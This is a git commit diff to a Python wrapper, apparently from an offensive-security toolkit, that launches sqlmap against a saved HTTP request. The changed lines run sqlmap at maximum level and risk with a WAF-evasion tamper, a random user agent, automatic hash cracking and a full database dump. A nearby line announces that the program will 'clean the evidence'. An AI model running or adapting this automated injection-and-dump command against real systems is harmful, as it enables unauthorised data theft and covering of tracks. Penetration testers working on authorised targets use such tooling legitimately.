874926efa85839fe34b197be6836a2eb855bd03c
nu11secur1ty <venvaropt@gmail.com>
2024-03-07 12:47:26 +0200

    Update G0BurpSQLmaPI.py

--- program/Framework-Advanced-Auto/G0BurpSQLmaPI.py
+++ program/Framework-Advanced-Auto/G0BurpSQLmaPI.py
@@ -11,12 +11,14 @@ print("The PoC process will be continue...\n")
 time.sleep(5)
 
 # Environment
-os.system('path_of_your_SQLMAP_environment_here')
+os.system('cd D:\\CVE\\sqlmap-nu11secur1ty\\')
 
 print(Style.RESET_ALL)
 
-# Here you can modify your OWN injection construction!
-os.system('python (Path_to_your_SQLMAP_Program_NODE)sqlmap.py -r (PATH_to_your_EXPLOIT.TXT)\\exploit.txt -p YOUR_VULNERABLE_PARAMETER --dbms=mysql --tamper=space2comment --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
+# Here you can modify your injection construction!
+# Your EXPLOIT ENVIRONMENT 
+env = 'your_exploit_environment_here: C:\\blah\\balah\\blah\\'
+os.system("python D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py -r "+env+'exploit.txt --dbms=mysql --tamper=space2comment --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')
 
 print("Please wait for the program to clean the evidence...\n")
 time.sleep(3)
